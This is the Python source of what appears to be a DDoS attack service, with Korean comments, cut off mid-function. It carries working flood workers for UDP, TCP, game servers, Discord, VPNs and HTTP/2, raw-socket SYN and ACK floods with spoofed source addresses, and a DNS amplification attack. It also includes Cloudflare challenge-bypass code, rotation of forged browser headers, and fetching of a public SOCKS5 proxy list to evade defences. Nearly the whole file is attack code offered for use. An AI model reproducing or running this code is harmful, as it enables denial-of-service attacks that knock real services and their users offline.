import asyncio
import socket
import time
import random
import ssl
import json
from flask import session, redirect, url_for, render_template_string
import subprocess
import secrets
import os
import threading
import uuid
import struct
from flask import Flask, request, jsonify
import multiprocessing
import requests
import psutil
from multiprocessing import Manager, Lock
app = Flask(__name__)

# ========== attack tracking ==========
active_attacks = {}  # {attack_id: [process1, process2, ...]}


global_process_lock = Lock()

# 설정 (256코어 기준, 필요시 조정)
MAX_TOTAL_PROCESSES = 4096
MAX_USER_PROCESSES = 256             # 한 사용자당 최대 동시 프로세스 수 (선택)
CPU_THRESHOLD = 95.6                  # CPU 사용률 임계값(%)
# ========== proxy list for CF bypass ==========
PROXY_LIST_URL = "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/all/data.txt"
socks5_proxies = []

class CTTCloudflareExtractor:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.challenge_url = self.target_url + "/cdn-cgi/challenge-platform/h/b"
        self.cookie = ""

    def measure(self, guess, layer):
        try:
            # 11ns 단위의 정밀 타이밍 시뮬레이션 및 측정
            headers = {"User-Agent": random.choice(BROWSER_PROFILES)["User-Agent"]}
            cookies = {"cf_clearance": guess}
            start = time.perf_counter()
            requests.get(self.challenge_url, headers=headers, cookies=cookies, timeout=5)
            return time.perf_counter() - start
        except:
            return -1.0

    def extract(self):
        chars = "abcdefghijklmnopqrstuvwxyz0123456789-_"
        for layer in range(1, 34):
            best_char, best_time = None, 0
            for char in chars:
                t = self.measure((self.cookie + char).ljust(32, 'A'), layer)
                if t > best_time:
                    best_time, best_char = t, char
            if best_char:
                self.cookie += best_char
        return self.cookie

# ========== 부하 모니터링 ==========
class LoadMonitor:
    def __init__(self):
        self.cpu_percent = 0.0

    def update(self):
        self.cpu_percent = psutil.cpu_percent(interval=0.2)

    def is_overloaded(self):
        self.update()
        return self.cpu_percent > CPU_THRESHOLD

    def get_status(self):
        self.update()
        return {
            "cpu_percent": self.cpu_percent,
            "total_processes": global_process_count.value,
            "active_attacks": len(active_attacks),
            "memory_gb": psutil.virtual_memory().used / (1024**3),
        }

load_monitor = LoadMonitor()


def inc_process_count(delta=1):
    with global_process_lock:
        global_process_count.value += delta

def dec_process_count(delta=1):
    with global_process_lock:
        global_process_count.value -= delta

def fetch_proxies():
    global socks5_proxies
    try:
        resp = requests.get(PROXY_LIST_URL, timeout=10)
        lines = resp.text.splitlines()
        socks5_proxies = [line.strip() for line in lines if line.strip().startswith("socks5://")]
        print(f"[*] Loaded {len(socks5_proxies)} SOCKS5 proxies")
    except Exception as e:
        print(f"[!] Proxy fetch failed: {e}")
        socks5_proxies = []

fetch_proxies()
threading.Timer(120, fetch_proxies).start()

import random
import string
from copy import deepcopy

# ========== 동적 브라우저 프로파일 생성 ==========
def generate_browser_profiles(count=1000):
    """
    count 개수만큼 무작위 브라우저 프로파일(헤더 딕셔너리)을 생성하여 리스트로 반환.
    각 프로파일은 requests/session에 사용 가능한 헤더를 포함.
    """
    # 기본 User-Agent 목록 (실제 브라우저 버전 다양화)
    ua_templates = [
        # Chrome Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 Edg/{version}.0.0.0",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
        # Firefox Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{version}.0) Gecko/20100101 Firefox/{version}.0",
        "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:{version}.0) Gecko/20100101 Firefox/{version}.0",
        # Chrome macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
        # Firefox macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:{version}.0) Gecko/20100101 Firefox/{version}.0",
        # Chrome Linux
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36",
        # Firefox Linux
        "Mozilla/5.0 (X11; Linux x86_64; rv:{version}.0) Gecko/20100101 Firefox/{version}.0",
        # Edge Windows (Chromium)
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36 Edg/{version}.0.0.0",
    ]

    # Accept 언어 목록 (다양한 지역)
    accept_languages = [
        "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
        "en-US,en;q=0.9,ko-KR;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8",
        "ja-JP,ja;q=0.9,en-US;q=0.8",
        "fr-FR,fr;q=0.9,en-US;q=0.8",
        "de-DE,de;q=0.9,en-US;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8",
        "ru-RU,ru;q=0.9,en-US;q=0.8",
        "ar-SA,ar;q=0.9,en;q=0.8",
        "pt-BR,pt;q=0.9,en-US;q=0.8",
        "it-IT,it;q=0.9,en-US;q=0.8",
        "nl-NL,nl;q=0.9,en-US;q=0.8",
        "pl-PL,pl;q=0.9,en-US;q=0.8",
        "tr-TR,tr;q=0.9,en;q=0.8",
        "vi-VN,vi;q=0.9,en-US;q=0.8",
        "th-TH,th;q=0.9,en;q=0.8",
        "id-ID,id;q=0.9,en-US;q=0.8",
    ]

    # Sec-Ch-Ua 포맷 (브랜드 버전)
    sec_ch_ua_templates = [
        '"Google Chrome";v="{version}", "Chromium";v="{version}", "Not.A/Brand";v="24"',
        '"Google Chrome";v="{version}", "Chromium";v="{version}", "Not.A/Brand";v="99"',
        '"Microsoft Edge";v="{version}", "Chromium";v="{version}", "Not.A/Brand";v="24"',
        '"Chromium";v="{version}", "Not(A:Brand";v="24", "Google Chrome";v="{version}"',
        '"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"',
        '"Google Chrome";v="{version}", "Chromium";v="{version}", "Not=A?Brand";v="24"',
        '"Microsoft Edge";v="{version}", "Chromium";v="{version}", "Not.A/Brand";v="99"',
    ]

    profiles = []
    for _ in range(count):
        # 랜덤 버전 (126 ~ 148)
        version = random.randint(126, 148)
        # User-Agent 생성
        ua_template = random.choice(ua_templates)
        user_agent = ua_template.format(version=version)

        # Sec-Ch-Ua 생성 (Firefox는 이 헤더가 없으므로 조건부)
        is_firefox = "Firefox" in user_agent
        if is_firefox:
            # Firefox는 Sec-Ch-Ua 관련 헤더가 없으므로 생략
            sec_ch_ua = None
            sec_ch_ua_mobile = None
            sec_ch_ua_platform = None
        else:
            sec_ch_ua_template = random.choice(sec_ch_ua_templates)
            sec_ch_ua = sec_ch_ua_template.format(version=version)
            # Mobile 플랫폼 구분
            sec_ch_ua_mobile = "?0" if random.random() < 0.8 else "?1"
            if "Windows" in user_agent:
                platform = '"Windows"'
            elif "Macintosh" in user_agent:
                platform = '"macOS"'
            elif "Linux" in user_agent:
                platform = '"Linux"'
            else:
                platform = '"Unknown"'
            sec_ch_ua_platform = platform

        # Accept-Encoding: 가끔 zstd 추가
        accept_encoding = random.choice(["gzip, deflate, br", "gzip, deflate, br, zstd"])

        # Accept: 기본값
        accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        if is_firefox:
            accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"

        # 언어
        accept_language = random.choice(accept_languages)

        # 프로파일 딕셔너리 생성
        profile = {
            "User-Agent": user_agent,
            "Accept": accept,
            "Accept-Language": accept_language,
            "Accept-Encoding": accept_encoding,
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        }
        # Firefox가 아닌 경우 Sec-Ch-Ua 추가
        if not is_firefox and sec_ch_ua:
            profile["Sec-Ch-Ua"] = sec_ch_ua
            profile["Sec-Ch-Ua-Mobile"] = sec_ch_ua_mobile
            profile["Sec-Ch-Ua-Platform"] = sec_ch_ua_platform

        # 약간의 랜덤 추가: Connection 헤더 (keep-alive)
        if random.random() < 0.3:
            profile["Connection"] = "keep-alive"

        profiles.append(profile)

    return profiles

# 기존의 방대한 BROWSER_PROFILES 리스트를 이 함수로 대체
BROWSER_PROFILES = generate_browser_profiles(count=1500)  # 원하는 개수로 조정

def create_evasive_ssl_context():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    base_ciphers = [
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-CHACHA20-POLY1305",
        "ECDHE-RSA-CHACHA20-POLY1305",
        "DHE-RSA-AES128-GCM-SHA256",
        "DHE-RSA-AES256-GCM-SHA384"
    ]
    random.shuffle(base_ciphers)
    cipher_string = ":".join(base_ciphers)
    try:
        context.set_ciphers(cipher_string)
    except:
        pass
    return context

# ========== Attack workers ==========
def udp_gbps_worker(ip, port, duration, attack_id, power_percent=1.0):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
        sock.setblocking(False)
        addr = (ip, port)
        end_time = time.time() + duration
        import random
        payload_size = random.randint(1300, 1400)
        payload = os.urandom(payload_size)
        
        if power_percent >= 1.0:
            skip_prob = 0
        else:
            skip_prob = 1.0 - power_percent
        
        while time.time() < end_time:
            if skip_prob > 0 and random.random() < skip_prob:
                continue
            try:
                sock.sendto(payload, addr)
            except BlockingIOError:
                pass
            except:
                pass
        sock.close()
    finally:
        dec_process_count()


def udp_pps_worker(ip, port, duration, attack_id, power_percent=1.0):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024)
        except Exception:
            pass
        sock.setblocking(False)

        data = b"\x00"
        addr = (ip, port)
        end_time = time.time() + duration
        skip_prob = 1.0 - min(1.0, max(0.0, power_percent))

        sendto = sock.sendto
        get_time = time.time

        if skip_prob > 0:
            rand = random.random
            while get_time() < end_time:
                if rand() < skip_prob:
                    continue
                try:
                    sendto(data, addr)
                except (BlockingIOError, InterruptedError):
                    pass
                except Exception:
                    pass
        else:
            while get_time() < end_time:
                try:
                    sendto(data, addr)
                except (BlockingIOError, InterruptedError):
                    continue
                except Exception:
                    pass
        sock.close()
    finally:
        dec_process_count()
    
    
def vse_worker(ip, port, duration, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock.sendto(data, (ip, port))
            except:
                pass
        sock.close()
    finally:
        dec_process_count()

def minecraft_worker(ip, port, duration, attack_id):
    data = b"\xFE\x01"
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            sock.connect((ip, port))
            sock.send(data)
            sock.close()
        except:
            pass
    dec_process_count()   # 여기는 finally 대신 함수 끝에 넣어도 됨 (예외 거의 없음)

def tcp_worker(ip, port, duration, attack_id):
    try:
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                sock.connect((ip, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
                sock.close()
            except:
                pass
    finally:
        dec_process_count()

def discord_flood_worker(ip, port, duration, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payloads = [
            b"\x80\x78\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00",
            b"\x13\x37\xca\xfe\x01\x00\x00\x00",
            b"\x00" * 1200
        ]
        end_time = time.time() + duration
        while time.time() < end_time:
            for p in payloads:
                for _ in range(500):
                    sock.sendto(p, (ip, port))
        sock.close()
    finally:
        dec_process_count()

def vpn_kill_worker(ip, port, duration, attack_id, vpn_type="auto"):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16*1024*1024)
        sock.setblocking(False)
        end_time = time.time() + duration
        if vpn_type == "auto":
            if port == 1194:
                vpn_type = "openvpn"
            elif port == 51820:
                vpn_type = "wireguard"
            elif port in [500, 4500]:
                vpn_type = "ipsec"
            else:
                vpn_type = "openvpn"
        if vpn_type == "openvpn":
            payloads = [b"\x38\x00\x00\x00", b"\x07\x00\x00\x01"]
        elif vpn_type == "wireguard":
            init_msg = struct.pack("<II", 1, random.randint(1, 0xFFFFFFFF)) + b"\x00"*116
            payloads = [init_msg]
        else:
            ike_init = b"\x00\x01\x01\x00" + b"\x00"*8 + b"\x00"*40
            payloads = [ike_init]
        while time.time() < end_time:
            for p in payloads:
                for _ in range(100):
                    try:
                        sock.sendto(p, (ip, port))
                    except:
                        pass
        sock.close()
    finally:
        dec_process_count()

def dns_amp_worker(target_ip, dns_servers, duration, attack_id):
    try:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            print("DNS-AMP requires root (raw socket). Falling back.")
            return
        dns_query = bytearray()
        dns_query += struct.pack(">H", random.randint(0, 65535))
        dns_query += b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\xff\x00\x01"
        end_time = time.time() + duration
        while time.time() < end_time:
            dns_server = random.choice(dns_servers)
            ip_header = struct.pack("!BBHHHBBH4s4s",
                0x45, 0, 20+8+len(dns_query), random.randint(0,65535), 0, 64,
                socket.IPPROTO_UDP, 0, socket.inet_aton(dns_server), socket.inet_aton(target_ip))
            udp_header = struct.pack("!HHHH", random.randint(10000,65535), 53, 8+len(dns_query), 0)
            packet = ip_header + udp_header + dns_query
            try:
                sock.sendto(packet, (target_ip, 53))
            except:
                pass
        sock.close()
    finally:
        dec_process_count()

# ---------- New methods from Go files ----------
def game_flood_worker(ip, port, duration, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock.sendto(payload, (ip, port))
            except:
                pass
        sock.close()
    finally:
        dec_process_count()

def home_flood_worker(ip, port, duration, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16*1024*1024)
        payloads = [
            b"A" * 1350,
            b"B" * 1100,
            b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        ]
        end_time = time.time() + duration
        idx = 0
        while time.time() < end_time:
            try:
                sock.sendto(payloads[idx % len(payloads)], (ip, port))
                idx += 1
            except:
                pass
        sock.close()
    finally:
        dec_process_count()

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_ip_header(src_ip, dst_ip, protocol, payload_len):
    ip_ver_ihl = 0x45  # IPv4, IHL=5
    tos = 0
    total_len = 20 + payload_len
    ip_id = random.randint(1, 65535)
    flags_offset = 0
    ttl = 255
    proto = protocol
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ver_ihl, tos, total_len, ip_id, flags_offset, ttl, proto, 0, src, dst)
    return ip_header

def create_tcp_header(src_port, dst_port, seq, ack, flags, window, urg_ptr, src_ip, dst_ip):
    """
    src_ip, dst_ip는 체크섬 계산을 위한 pseudo header에 필요
    """
    tcp_len = 20  # TCP header length without options
    # 임시 헤더 (체크섬 0)
    tcp_header = struct.pack('!HHLLBBHHH', 
                             src_port, dst_port, seq, ack,
                             (5 << 4), flags, window, 0, urg_ptr)
    src_ip_bytes = socket.inet_aton(src_ip)
    dst_ip_bytes = socket.inet_aton(dst_ip)
    pseudo = struct.pack('!4s4sBBH', src_ip_bytes, dst_ip_bytes, 0, socket.IPPROTO_TCP, tcp_len)
    

    combined = pseudo + tcp_header
    chk = checksum(combined)
    tcp_header = struct.pack('!HHLLBBHHH', 
                             src_port, dst_port, seq, ack,
                             (5 << 4), flags, window, chk, urg_ptr)
    return tcp_header

# 실제 워커들
def tcp_syn_worker(ip, port, duration, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        dst_ip = ip
        dst_port = port
        end_time = time.time() + duration
        while time.time() < end_time:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            seq = random.randint(1, 0xFFFFFFFF)
            tcp_flags = 0x02  # SYN
            window = 65535
            payload = b''
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), dst_port, seq, 0, (5<<4), tcp_flags, window, 0, 0)
            # pseudo header for checksum
            src_ip_bytes = socket.inet_aton(src_ip)
            dst_ip_bytes = socket.inet_aton(dst_ip)
            pseudo = struct.pack('!4s4sBBH', src_ip_bytes, dst_ip_bytes, 0, socket.IPPROTO_TCP, len(tcp_header))
            psh = pseudo + tcp_header
            chk = checksum(psh)
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), dst_port, seq, 0, (5<<4), tcp_flags, window, chk, 0)
            ip_header = create_ip_header(src_ip, dst_ip, socket.IPPROTO_TCP, len(tcp_header))
            packet = ip_header + tcp_header
            sock.sendto(packet, (dst_ip, 0))
    finally:
        dec_process_count()

def tcp_ack_worker(ip, port, duration, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        dst_ip = ip
        dst_port = port
        end_time = time.time() + duration
        while time.time() < end_time:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            seq = random.randint(1, 0xFFFFFFFF)
            ack = random.randint(1, 0xFFFFFFFF)
            tcp_flags = 0x10  # ACK
            window = 65535
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), dst_port, seq, ack, (5<<4), tcp_flags, window, 0, 0)
            src_ip_bytes = socket.inet_aton(src_ip)
            dst_ip_bytes = socket.inet_aton(dst_ip)
            pseudo = struct.pack('!4s4sBBH', src_ip_bytes, dst_ip_bytes, 0, socket.IPPROTO_TCP, len(tcp_header))
            chk = checksum(pseudo + tcp_header)
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), dst_port, seq, ack, (5<<4), tcp_flags, window, chk, 0)
            ip_header = create_ip_header(src_ip, dst_ip, socket.IPPROTO_TCP, len(tcp_header))
            packet = ip_header + tcp_header
            sock.sendto(packet, (dst_ip, 0))
    finally:
        dec_process_count()

def stomp_worker(ip, port, duration, attack_id):
    # PSH+ACK flood
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        dst_ip = ip
        dst_port = port
        end_time = time.time() + duration
        while time.time() < end_time:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            seq = random.randint(1, 0xFFFFFFFF)
            ack = random.randint(1, 0xFFFFFFFF)
            tcp_flags = 0x18  # PSH+ACK
            window = 65535
            payload = os.urandom(20)  # small random payload
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), dst_port, seq, ack, (5<<4), tcp_flags, window, 0, 0)
            pseudo = struct.pack('!4s4sBBH', socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, socket.IPPROTO_TCP, len(tcp_header)+len(payload))
            chk = checksum(pseudo + tcp_header + payload)
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), dst_port, seq, ack, (5<<4), tcp_flags, window, chk, 0)
            ip_header = create_ip_header(src_ip, dst_ip, socket.IPPROTO_TCP, len(tcp_header)+len(payload))
            packet = ip_header + tcp_header + payload
            sock.sendto(packet, (dst_ip, 0))
    finally:
        dec_process_count()

def socket_raw_worker(ip, port, duration, attack_id):
    # Raw TCP SYN flood with larger random payload
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        dst_ip = ip
        dst_port = port
        end_time = time.time() + duration
        while time.time() < end_time:
            src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            seq = random.randint(1, 0xFFFFFFFF)
            tcp_flags = 0x02  # SYN
            window = 65535
            payload = os.urandom(512)  # bigger payload
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), dst_port, seq, 0, (5<<4), tcp_flags, window, 0, 0)
            src_ip_bytes = socket.inet_aton(src_ip)
            dst_ip_bytes = socket.inet_aton(dst_ip)
            pseudo = struct.pack('!4s4sBBH', src_ip_bytes, dst_ip_bytes, 0, socket.IPPROTO_TCP, len(tcp_header)+len(payload))
            chk = checksum(pseudo + tcp_header + payload)
            tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535), dst_port, seq, 0, (5<<4), tcp_flags, window, chk, 0)
            ip_header = create_ip_header(src_ip, dst_ip, socket.IPPROTO_TCP, len(tcp_header)+len(payload))
            packet = ip_header + tcp_header + payload
            sock.sendto(packet, (dst_ip, 0))
    finally:
        dec_process_count()

def handshake_worker(ip, port, duration, attack_id):
    # Full TCP handshake using connect (resource exhaustion)
    try:
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.0)
                sock.connect((ip, port))
                sock.send(b'\x00')
                sock.close()
            except:
                pass
    finally:
        dec_process_count()

def tls_flood_worker(target_url, duration, attack_id):
    try:
        import aiohttp
        import asyncio
        async def _worker():
            connector = aiohttp.TCPConnector(limit=0, ssl=create_evasive_ssl_context())
            async with aiohttp.ClientSession(connector=connector) as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        async with session.get(target_url) as resp:
                            await resp.read()
                    except:
                        pass
        asyncio.run(_worker())
    finally:
        dec_process_count()

def tlsplus_flood_worker(target_url, duration, attack_id):
    try:
        import ssl
        import urllib.parse
        parsed = urllib.parse.urlparse(target_url)
        host = parsed.hostname
        port = parsed.port or 443
        path = parsed.path or "/"
        payload = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n".encode()
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ssock = ctx.wrap_socket(sock, server_hostname=host)
                ssock.send(payload)
                ssock.close()
            except:
                pass
    finally:
        dec_process_count()

def cf_bypass_worker(target_url, duration, attack_id):
    try:
        import aiohttp
        from flask import request

        extractor = CTTCloudflareExtractor(target_url)
        valid_cookie = extractor.extract()
        
        async def _worker():
            connector = aiohttp.TCPConnector(
                limit=50000,
                ttl_dns_cache=300,
                use_dns_cache=True,
                ssl=False
            )
            async with aiohttp.ClientSession(connector=connector) as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    headers = random.choice(BROWSER_PROFILES).copy()
                    headers["Cookie"] = f"cf_clearance={valid_cookie}"
                    try:
                        async with session.get(target_url, headers=headers) as resp:
                            await resp.release()
                    except:
                        pass
        asyncio.run(_worker())
    finally:
        dec_process_count()

# ========== Integrated Go Methods (Converted to Python) ==========

def tcp_bypass_worker(ip, port, duration, attack_id):
    try:
        addr = (ip, port)
        payload_2 = bytearray(512)
        payloads = [
            f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n".encode(),
            b"\x16\x03\x01\x00\x6d\x01\x00\x00\x69\x03\x03",
            bytes(payload_2)
        ]
        p_len = len(payloads)
        end_time = time.time() + duration

        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3.0)
                sock.connect(addr)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024)
                for j in range(100):
                    if time.time() >= end_time:
                        break
                    sock.sendall(payloads[j % p_len])
                    time.sleep(0.001)
                sock.close()
            except:
                pass
    finally:
        dec_process_count()

def message_worker(ip, port, duration, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128 * 1024 * 1024)
        addr = (ip, port)
        end_time = time.time() + duration
        
        payloads = [
            b"\x53\x41\x4d\x50\x00\x00\x00\x00\x00\x00" + b"i",
            b"\x53\x41\x4d\x50\x00\x00\x00\x00\x00\x00" + b"p",
            b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x00",
            os.urandom(1200)
        ]
        p_len = len(payloads)
        sendto = sock.sendto
        get_time = time.time
        
        while get_time() < end_time:
            for i in range(20000):
                try:
                    sendto(payloads[i % p_len], addr)
                except:
                    continue
        sock.close()
    finally:
        dec_process_count()

def udp_bypass_worker(ip, port, duration, attack_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 128 * 1024 * 1024)
        addr = (ip, port)
        
        payload_3 = bytearray([0x41] * 1200)
        payloads = [
            b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00",
            b"\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x0c\x26\x87\xdd\x00\x5d\x36\xdb\xe3\xae\xa9\xc3\x8d",
            b"\x00\x02\xaf\xbe\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00",
            bytes(payload_3)
        ]
        p_len = len(payloads)
        end_time = time.time() + duration

        while time.time() < end_time:
            for j in range(25000):
                if time.time() >= end_time:
                    break
                try:
                    sock.sendto(payloads[j % p_len], addr)
                except:
                    pass
        sock.close()
    finally:
        dec_process_count()

async def send_http2_multiplex_request(client, target_url):
    profile = random.choice(BROWSER_PROFILES)
    headers = {
        "User-Agent": profile["User-Agent"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5"
    }
    try:
        # HTTP/2 connection pooling auto-handled cleanly via high concurrent limit
        async with client.get(target_url, headers=headers) as response:
            await response.read()
    except:
        pass

async def http2_flood_async_loop(target_url, duration):
    import aiohttp
    connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        end_time = time.time() + duration
        while time.time() < end_time:
            # Replicates multiplexing parallel loops within the execution time windows
            tasks = [send_http2_multiplex_request(session, target_url) for _ in range(250)]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.001)

def http2_flood_worker(target_url, duration, attack_id):
    try:
        asyncio.run(http2_flood_async_loop(target_url, duration))
    finally:
        dec_process_count()

# ========== Plain HTTP (고정 헤더, 브라우저 프로필 없음) ==========
def http_plain_worker(ip, port, method, duration, attack_id):
    """Fixed header HTTP flood using simple sockets (no browser profiles)"""
    try:
        payload = f"{method} / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: ToxicX/1.0\r\nConnection: keep-alive\r\n\r\n".encode()
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                sock.connect((ip, port))
                sock.send(payload)
                sock.close()
            except:
                pass
    finally:
        dec_process_count()

# ========== HTTP Browser (100개 프로필 순환, 기존 고성능) ==========
async def http_browser_async(ip, port, method, duration):
    import aiohttp, asyncio, random
    url = f"http://{ip}:{port}"
    connector = aiohttp.TCPConnector(limit=5000, limit_per_host=2000, ttl_dns_cache=600, ssl=False, force_close=False, keepalive_timeout=30)
    headers_pool = [dict(p) for p in BROWSER_PROFILES]  # 100개 프로필
    timeout = aiohttp.ClientTimeout(total=5, connect=2, sock_read=3)

    async def worker(session):
        end = time.time() + duration
        while time.time() < end:
            try:
